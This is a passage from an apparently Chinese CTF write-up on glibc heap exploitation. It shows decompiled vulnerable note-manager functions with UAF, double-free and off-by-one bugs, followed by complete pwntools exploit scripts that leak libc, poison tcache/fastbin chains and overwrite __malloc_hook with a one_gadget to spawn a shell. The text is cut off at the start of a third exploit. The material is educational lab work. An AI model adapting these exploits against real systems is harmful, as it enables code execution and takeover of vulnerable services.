class="comment">// ebx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> idx; <span class="comment">// [rsp+4h] [rbp-1Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;please input note idx&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%u&quot;</span>, &amp;idx);</span><br><span class="line">  <span class="keyword">if</span> ( idx &lt;= <span class="number">0xF</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v0 = idx;</span><br><span class="line">    note_addr[v0] = <span class="built_in">malloc</span>(<span class="number">0x68</span>uLL);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;please input content&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, note_addr[idx], <span class="number">0x68</span>uLL);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;idx error&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>create函数限制申请的idx最大为15，并且固定了每个chunk的大小为0x68。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __cdecl <span class="title function_">delete</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> idx; <span class="comment">// [rsp+Ch] [rbp-14h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v1; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v1 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;please input note idx&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%u&quot;</span>, &amp;idx);</span><br><span class="line">  <span class="keyword">if</span> ( idx &lt;= <span class="number">0xF</span> )</span><br><span class="line">    <span class="built_in">free</span>(note_addr[idx]);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;idx error&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>delete函数中有很明显的UAF漏洞，并且有机会实现double free。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __cdecl <span class="title function_">show</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> idx; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v1; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v1 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;please input note idx&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%u&quot;</span>, &amp;idx);</span><br><span class="line">  <span class="keyword">if</span> ( idx &lt;= <span class="number">0xF</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( note_addr[idx] )</span><br><span class="line">      write(<span class="number">1</span>, note_addr[idx], <span class="number">0x68</span>uLL);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;note is null&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;idx error&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>show函数可以用来泄露地址。</p><p>题目给出libc是2.31版本，也就是有tcache。程序固定了chunk size，也就阻断了直接利用unsortedbin的手法。tcachebin中的chunk不会合并，但是fastbin中的chunk在触发fastbin_consolidate时可以合并，两个0x68的chunk合并在一起就可以进入到smallbin，这样就有机会泄露libc地址了。程序用scanf来读取idx，利用scanf我们就能触发fastbin_consolidate。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12</span>):</span><br><span class="line">    add(i)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):  <span class="comment"># 0-6tcache  0-1fastbin</span></span><br><span class="line">    delete(i)</span><br><span class="line"></span><br><span class="line"><span class="comment"># dbg()</span></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;&gt;&gt;&gt; &#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;please input note idx&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;1&#x27;</span>*<span class="number">0x500</span>)  <span class="comment"># 触发fastbin consolidate，使得fastbin中的chunk可以合并</span></span><br><span class="line"></span><br><span class="line">show(<span class="number">7</span>)  <span class="comment"># smallbin，但是依然可以通过7和8来访问到原本的chunk，但是7、8已经不在fastbin中了</span></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">main_arena = u64(r.recv(<span class="number">6</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libcbase = main_arena-<span class="number">0x01eccb0</span></span><br><span class="line">malloc_hook = libcbase+<span class="number">0x01ecb70</span></span><br><span class="line">one = [<span class="number">0xe3b2e</span>, <span class="number">0xe3b31</span>, <span class="number">0xe3b34</span>]</span><br><span class="line">free_hook = libcbase+<span class="number">0x1eee48</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;malloc_hook&quot;</span>, <span class="built_in">hex</span>(malloc_hook))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libcbase:&quot;</span>, <span class="built_in">hex</span>(libcbase))</span><br></pre></td></tr></table></figure><p>泄露了libc地址后，考虑如何将chunk申请到hook处。因为有tcache，并且题目有uaf，所以最方便的的double free方法是同时塞到tcachebin和fastbin中。具体操作是，先填满tcachebin，然后释放多两个同样大小的chunk进fastbin，之后从tcachebin里面取一个chunk出来，再次释放fastbin中的chunk，这样chunk就会存在于两个bin中。tcachebin的优先级大于fastbin，所以先取一个chunk，修改其fd为hook，然后取到fastbin中的第二个chunk时就是malloc hook的位置了，然后修改其为ongadget即可getshell。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">delete(<span class="number">9</span>)  <span class="comment"># 0 fastbin</span></span><br><span class="line">delete(<span class="number">10</span>)  <span class="comment"># 1 fastbin</span></span><br><span class="line">add(<span class="number">6</span>)  <span class="comment"># 从6 tcache中取</span></span><br><span class="line">delete(<span class="number">10</span>)  <span class="comment"># 6 tcache，导致10既在tcache中，又在fastbin中，相当于double free</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">13</span>, p64(malloc_hook-<span class="number">0x33</span>))  <span class="comment"># 从6 tcache中取</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">6</span>):</span><br><span class="line">    add(i)  <span class="comment"># 取完tcache</span></span><br><span class="line">add(<span class="number">0</span>)  <span class="comment"># 取1 fastbin</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0 fastbin，和6tache指向同一个chunk，所以相当于已经打到了malloc_hook</span></span><br><span class="line">add(<span class="number">14</span>, <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x23</span>+p64(one[<span class="number">1</span>]+libcbase))</span><br></pre></td></tr></table></figure><h5 id="EXP-11"><a href="#EXP-11" class="headerlink" title="EXP"></a>EXP</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = process(<span class="string">&#x27;./vuln&#x27;</span>)</span><br><span class="line"><span class="comment"># r = remote(&#x27;node5.buuoj.cn&#x27;, 28743)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./vuln&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(r)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx, content=<span class="string">b&#x27;/bin/sh\x00&#x27;</span></span>):</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;&gt;&gt;&gt; &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;please input note idx&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;please input content&#x27;</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;&gt;&gt;&gt; &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;please input note idx&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;&gt;&gt;&gt; &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;please input note idx&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12</span>):</span><br><span class="line">    add(i)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):  <span class="comment"># 0-7tcache  0-1fastbin</span></span><br><span class="line">    delete(i)</span><br><span class="line"></span><br><span class="line"><span class="comment"># dbg()</span></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;&gt;&gt;&gt; &#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;please input note idx&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;1&#x27;</span>*<span class="number">0x500</span>)  <span class="comment"># 触发fastbin consolidate，使得fastbin中的chunk可以合并</span></span><br><span class="line">show(<span class="number">7</span>)  <span class="comment"># smallbin，但是依然可以通过7和8来访问到原本的chunk，但是8已经不在fastbin中了</span></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">main_arena = u64(r.recv(<span class="number">6</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libcbase = main_arena-<span class="number">0x01eccb0</span></span><br><span class="line">malloc_hook = libcbase+<span class="number">0x01ecb70</span></span><br><span class="line">one = [<span class="number">0xe3b2e</span>, <span class="number">0xe3b31</span>, <span class="number">0xe3b34</span>]</span><br><span class="line">free_hook = libcbase+<span class="number">0x1eee48</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;malloc_hook&quot;</span>, <span class="built_in">hex</span>(malloc_hook))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libcbase:&quot;</span>, <span class="built_in">hex</span>(libcbase))</span><br><span class="line"></span><br><span class="line">delete(<span class="number">9</span>)  <span class="comment"># 0 fastbin</span></span><br><span class="line">delete(<span class="number">10</span>)  <span class="comment"># 1 fastbin</span></span><br><span class="line">add(<span class="number">6</span>)  <span class="comment"># 从6 tcache中取</span></span><br><span class="line">delete(<span class="number">10</span>)  <span class="comment"># 6 tcache，导致10既在tcache中，又在fastbin中，相当于double free</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">13</span>, p64(malloc_hook-<span class="number">0x33</span>))  <span class="comment"># 从6 tcache中取</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">6</span>):</span><br><span class="line">    add(i)  <span class="comment"># 取完tcache</span></span><br><span class="line">add(<span class="number">0</span>)  <span class="comment"># 取1 fastbin</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0 fastbin，和6tache指向同一个chunk，所以相当于已经打到了malloc_hook</span></span><br><span class="line">add(<span class="number">14</span>, <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x23</span>+p64(one[<span class="number">1</span>]+libcbase))</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;&gt;&gt;&gt; &#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;please input note idx&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;1&#x27;</span>)  <span class="comment"># 触发hook</span></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h3 id="0x0D-one-byte"><a href="#0x0D-one-byte" class="headerlink" title="0x0D one_byte"></a>0x0D one_byte</h3><h5 id="分析-12"><a href="#分析-12" class="headerlink" title="分析"></a>分析</h5><p>程序提供了add，delete，view和edit四个函数。其中程序对chunk管理添加了inused标记，size标记，chunk地址标记，三个list都在bss段上，不在堆内存上。程序限制了chunk数量最多为32个，size最大为0x200。</p><p>在delete函数，释放一个chunk后程序会将inused标记置零，并且所有函数都会检查inused标记。也就是说并没有uaf漏洞。但是在edit函数有一个很明显的off by one的漏洞，可以修改下一个相邻的chunk的size字段。view函数输出的size以size list中的size为准，所以没法简单地通过chunk重叠来泄露信息。</p><p>想要泄露libc地址，首先得找到一个chunk的fd指向main_arena或者其他libc地址，而且不是释放的状态才能被泄露出来。这里有一个比较好想的思路，那就是把一个chunk塞进unsortedbin中然后再取出来就能泄露了。</p><p>那么下一步就该想怎么修改fd而打到hook处getshell了。但是这个程序没有uaf，没法直接修改fd，想要实现这一点，要想办法实现double free。显然要利用off by one来实现。这里的想法是：首先用off by one使chunk1和chunk2重叠，释放掉chunk1使其进入unsortedbin中，其中两个chunk大小都要大于fastbin大小，chunk1大于chunk2，然后取chunk1-chunk2的大小，利用unsortedbin切割来使chunk2依然留在unsortedbin中，但是因为chunk2并没有被释放过，所以你既可以操控它，它又在bin中，如果释放一次chunk2，它会进入tcachebin，那就造成了double free，有点像曲线地实现了house of botcake的感觉。</p><h5 id="EXP-12"><a href="#EXP-12" class="headerlink" title="EXP"></a>EXP</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = process(<span class="string">&#x27;./vuln&#x27;</span>)</span><br><span class="line"><span class="comment"># r = remote(&#x27;node5.buuoj.cn&#x27;, 28743)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./vuln&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(r)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx, size</span>):</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;&gt;&gt;&gt; &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;please input chunk_idx: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Enter chunk size: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;&gt;&gt;&gt; &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;please input chunk_idx: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">view</span>(<span class="params">idx</span>):</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;&gt;&gt;&gt; &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;please input chunk_idx: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, content=<span class="string">b&#x27;/bin/sh\x00&#x27;</span></span>):</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;&gt;&gt;&gt; &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;please input chunk_idx: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(i, <span class="number">0x90</span>)</span><br><span class="line">add(<span class="number">7</span>, <span class="number">0x98</span>)  <span class="comment"># 可以利用off by one覆盖到下一个chunk的size字段</span></span><br><span class="line">add(<span class="number">8</span>, <span class="number">0xf0</span>)</span><br><span class="line">add(<span class="number">9</span>, <span class="number">0x90</span>)</span><br><span class="line">add(<span class="number">10</span>, <span class="number">0x90</span>)</span><br><span class="line">add(<span class="number">11</span>, <span class="number">0x90</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>, -<span class="number">1</span>, -<span class="number">1</span>):  <span class="comment"># tcache 0xa0</span></span><br><span class="line">    delete(i)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x98</span>+p8(<span class="number">0xa1</span>)  <span class="comment"># 实际上chunk8的size是0x1a0</span></span><br><span class="line">edit(<span class="number">7</span>, payload)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12</span>, <span class="number">12</span>+<span class="number">7</span>):</span><br><span class="line">    add(i, <span class="number">0x190</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12</span>, <span class="number">12</span>+<span class="number">7</span>):  <span class="comment"># tcache 0x1a0</span></span><br><span class="line">    delete(i)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">8</span>)  <span class="comment"># unsortedbin</span></span><br><span class="line">add(<span class="number">19</span>, <span class="number">0xf0</span>)  <span class="comment"># 实际size是0x100，会从chunk8，也就是unsortedbin中被切割出来。然后chunk9就会有main arena的地址。之所以要这么做是因为chunk9没被free，而chunk8没法泄露地址。</span></span><br><span class="line"><span class="comment"># dbg()</span></span><br><span class="line">view(<span class="number">9</span>)  <span class="comment"># chunk9 依然inused,也可以泄露19，但是偏移不太一样</span></span><br><span class="line">libc_base = u64(r.recv(<span class="number">6</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x1ECBE0</span>  <span class="comment"># 可以通过vmmap确定</span></span><br><span class="line">log.success(<span class="string">&#x27;libc_base: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">malloc_hook = libc_base+<span class="number">0x1ecb70</span></span><br><span class="line">one = [<span class="number">0xe3afe</span>, <span class="number">0xe3b01</span>, <span class="number">0xe3b04</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">7</span>):</span><br><span class="line">    add(i, <span class="number">0x90</span>)  <span class="comment"># 取完tcache 0xa0</span></span><br><span class="line"><span class="comment"># dbg()</span></span><br><span class="line">add(<span class="number">20</span>, <span class="number">0x90</span>)  <span class="comment"># 取unsortedbin</span></span><br><span class="line">delete(<span class="number">0</span>)  <span class="comment"># tcache</span></span><br><span class="line">delete(<span class="number">9</span>)  <span class="comment"># tcache,其实就是chunk20</span></span><br><span class="line">payload = p64(malloc_hook)</span><br><span class="line">edit(<span class="number">20</span>, payload)</span><br><span class="line">add(<span class="number">21</span>, <span class="number">0x90</span>)  <span class="comment"># 取tcache 原本的chunk9，也是chunk20</span></span><br><span class="line">add(<span class="number">22</span>, <span class="number">0x90</span>)  <span class="comment"># tcache 但是由于chunk9/20的fd被修改，申请到了malloc-0x33的位置</span></span><br><span class="line">payload = p64(libc_base+one[<span class="number">1</span>])</span><br><span class="line">edit(<span class="number">22</span>, payload)</span><br><span class="line">add(<span class="number">23</span>, <span class="number">0x90</span>)  <span class="comment"># 触发hook</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h3 id="0x0E-ptmalloc2-it’s-myheap"><a href="#0x0E-ptmalloc2-it’s-myheap" class="headerlink" title="0x0E ptmalloc2 it’s myheap"></a>0x0E ptmalloc2 it’s myheap</h3><h5 id="分析-13"><a href="#分析-13" class="headerlink" title="分析"></a>分析</h5><p>有add，delete和view三个函数，还有一个泄露puts地址的函数。add函数会申请一个0x18的chunk作为data chunk记录用户申请的buf chunk的size、inused和buf chunk的地址，并且把data chunk记录在chunk list当中，限制只能申请15个chunk。delete和view函数会检查inused字段。delete函数会先释放data chunk后释放buf chunk，然后置零inused，但是并不会将其他信息清零。libc版本是2.35，版本比较高，不能通过hook来getshell，但是可以通过IO_file等手法来攻击。这里选择通过堆风水来申请到栈上构建ROP来getshell。</p><p>可以注意到，data chunk是比较好控制的。data chunk上储存着堆地址，如果我想要泄露这个地址，只需要在释放过一个chunk后，再申请一个0x18的chunk就能泄露这些信息。并且也能修改inused字段，这也就意味着我们有机会double free。当然tcache在高版本下没那么好double free，但是可以修改完inused之后利用uaf实现一个chunk同时进入fastbin和tcachebin中，接着就是修改fd到栈上即可，这个fd需要与0x20对齐，并进行key加密。这是一种思路。</p><p>还有另一种思路，可以通过修改data chunk上的buf地址，修改为堆头的地址，然后修改<code>tcache_perthread_struct</code>，劫持tcachebin链表，将栈地址写到特定偏移上，然后再申请相应大小的chunk就能申请到栈上。下面的exp利用的是这种思路。</p><p>关于栈地址的泄露，由于出题人送了libc地址，所以可以利用environ来获取栈地址，再通过调试找到合适的偏移写入rop链即可。但是实际上栈地址增长不规律，所以exp有1&#x2F;16几率打通。</p><h5 id="EXP-13"><a href="#EXP-13" class="headerlink" title="EXP"></a>EXP</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span 